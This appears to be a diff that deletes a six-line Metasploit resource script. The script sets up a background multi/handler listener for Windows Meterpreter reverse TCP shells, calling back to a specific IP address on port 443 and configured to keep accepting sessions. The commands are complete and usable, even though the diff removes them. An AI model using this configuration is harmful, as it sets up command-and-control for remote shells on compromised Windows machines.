@@ -1,6 +1,0 @@
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 35.165.57.79
-set LPORT 443
-set ExitOnSession false
-exploit -j
